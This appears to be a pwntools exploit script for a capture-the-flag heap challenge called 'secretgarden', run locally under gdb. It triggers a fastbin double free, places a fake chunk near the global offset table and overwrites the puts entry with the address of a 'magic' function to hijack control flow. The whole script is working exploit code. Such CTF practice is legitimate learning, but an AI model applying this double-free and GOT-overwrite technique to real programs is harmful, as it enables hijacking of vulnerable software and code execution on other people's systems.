from pwn import*

context(arch='amd64',os='linux')
context.log_level = 'debug'
context.terminal = ['tmux','splitw','-h']

r = process('./secretgarden')
elf = ELF('./secretgarden')

gdb.attach(r)

magic = elf.symbols['magic']
puts_got = elf.got['puts']
def info():
    log.info('x64 Operation Program')
    log.info('magic = '+hex(magic))
    log.info('puts_got = '+hex(puts_got))


    print('\n')
    print('--------------------------')
    log.info('add   -> main + 109')
    log.info('visit -> main + 121')
    log.info('del   -> main + 133')
    log.info('clean -> main + 145')
    print('--------------------------')

    pause()

def add(length, flower, color):
    r.sendlineafter('choice : ','1')
    r.sendlineafter('name :',str(length))
    r.sendlineafter('flower :',str(flower))
    r.sendlineafter('flower :',str(color))

    pause()
def visit():
    r.sendlineafter('choice : ','2')
    pause()

def remove(index):
    r.sendlineafter('choice : ','3')
    r.sendlineafter('garden:',str(index))
    pause()

def clean():
    r.sendlineafter('choice : ','4')
    pause()

def leave():
    r.sendlineafter('choice : ','5')
    r.recv()
    pause()

def main():
    info()
    
    add(0x50,'AAAA','AAAA')
    add(0x50,'BBBB','BBBB')

    remove(0)
    remove(1)
    remove(0)

#    fakechunk = p64(0x601ffa)
    fakechunk = p64(0x602012)
    add(0x50,fakechunk,'CCCC')
#    add(0x50,'DDDD','DDDD')
    
    payload = ''
    payload += 'A'*22             
    payload += p64(magic)

    add(0x50,'EEEE','EEEE')
    add(0x50,'FFFF','FFFF')
    add(0x50,payload,'G')
    pause()



    r.interactive()
if __name__ == '__main__':
    main()

